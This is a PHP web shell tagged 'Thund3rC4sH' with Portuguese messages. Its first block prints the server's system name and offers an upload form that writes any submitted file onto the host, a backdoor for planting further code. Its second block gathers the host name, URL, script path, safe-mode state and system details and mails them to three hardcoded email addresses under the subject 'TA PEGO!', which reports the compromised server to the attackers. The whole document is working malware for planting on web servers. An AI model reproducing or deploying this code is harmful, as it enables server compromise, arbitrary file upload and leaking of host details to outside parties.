Thund3rC4sH
<?php echo '<b><br><br><br><br><br><br><center><font color:"blue"><span style="font-family: monospace;"><span style="color: rgb(255, 255, 255);"><br><br><font color="black">'.php_uname().'</font><br></b>'; echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">'; echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Arquivo upado !!!</b><br><br>'; } else { echo '<b>Upload Fail !!!</b><br><br></font>'; } }?>
<?php
ob_start();
phpinfo();
$phpinfo = array('phpinfo' => array());
if(preg_match_all('#(?:<h2>(?:<a name=".*?">)?(.*?)(?:</a>)?</h2>)|(?:<tr(?: class=".*?")?><t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>(?:<t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>(?:<t[hd](?: class=".*?")?>(.*?)\s*</t[hd]>)?)?</tr>)#s', ob_get_clean(), $matches, PREG_SET_ORDER)){
    foreach($matches as $match){
        if(strlen($match[1]))
            $phpinfo[$match[1]] = array();
        elseif(isset($match[3]))
            $phpinfo[end(array_keys($phpinfo))][$match[2]] = isset($match[4]) ? array($match[3], $match[4]) : $match[3];
        else
            $phpinfo[end(array_keys($phpinfo))][] = $match[2];
    }
}

ini_set("max_execution_time",-1);
set_time_limit(0);
$user = @get_current_user();
$uname = @php_uname();
$data = date('h-i-s, j-m-y, it is w Day z');
$safemode = @ini_get('safe_mode');
$url = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$caminho = substr($_SERVER['SCRIPT_FILENAME'], 0, strlen($_SERVER['SCRIPT_FILENAME']) - strlen(strrchr($_SERVER['SCRIPT_FILENAME'], "\\")));
if ($safemode == '') {
    $safemode = "OFF";
} else { 
    $safemode = " $SafeMode ";
}

if (strpos(ini_get("sendmail_path"), "sendmail") !== false) {
    $dados ="<b>Nome: </b>{$uname}<br>";
    $dados.="<b>Safe Mode:</b>{$phpinfo['PHP Core']['safe_mode'][0]}<br />";
    $dados.="<b>URL: </b>{$url}<br>";
    $dados.="<b>Data: </b>{$data}<br>";
    $dados.="<b>Caminho: </b>{$caminho}<br>";
    $dados.="<b>System: </b>{$phpinfo['phpinfo']['System']}<br />";
 
    $assunto = "TA PEGO!";
    $emails = array("chaveiromamede@terra.com.br", "contapt11@gmail.com", "lucas_yc@hotmail.com");
    $headers="From: <$emails[0]>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-type: text/html; charset=iso-8859-1\r\n";
    $headers.="X-Mailer: PHP/".phpversion()."\r\n";

    foreach ($emails as $email) {
        if(mail($email,$assunto,$dados,$headers)){
            echo $dados;
            echo "OK enviado~";
        } else {
            echo "Não foi.";
        }
    }
    exit();
} else {
    echo "Sendmail não configurado.";
    exit();
}
?>